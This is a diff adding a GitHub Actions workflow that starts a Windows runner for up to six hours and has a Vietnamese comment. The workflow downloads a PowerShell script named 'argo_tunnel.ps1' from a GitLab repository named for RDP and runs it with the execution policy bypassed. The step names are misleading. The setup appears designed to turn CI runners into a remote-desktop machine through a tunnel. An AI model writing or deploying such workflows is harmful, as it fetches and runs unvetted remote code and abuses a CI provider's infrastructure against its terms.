@@ -1,0 +1,18 @@
+name: Run PC on Workflorws
+
+on:
+  workflow_dispatch:
+
+jobs:
+  run-argo-script:
+    runs-on: windows-2025
+    timeout-minutes: 360  # Giới hạn job tối đa 6 tiếng
+
+    steps:
+      - name: Download playstation ps1 file
+        run: |
+          Invoke-WebRequest -Uri "https://gitlab.com/gitrdp124/sv2025-rdp/-/raw/main/argo_tunnel.ps1" -OutFile "argo_tunnel.ps1"
+
+      - name: Run apps1 file
+        run: |
+          powershell -ExecutionPolicy Bypass -File .\argo_tunnel.ps1
